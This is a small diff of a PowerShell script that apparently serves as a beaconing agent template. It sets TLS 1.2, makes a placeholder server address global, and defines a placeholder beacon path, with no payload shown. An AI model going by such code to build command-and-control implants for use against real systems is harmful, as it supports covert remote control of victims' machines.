@@ -4,7 +4,7 @@
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 
 # Server details
-$serverAddress = '{{SERVER_ADDRESS}}'
+$global:serverAddress = '{{SERVER_ADDRESS}}'
 
 # Initial endpoint paths
 $beaconPath = '{{BEACON_PATH}}'
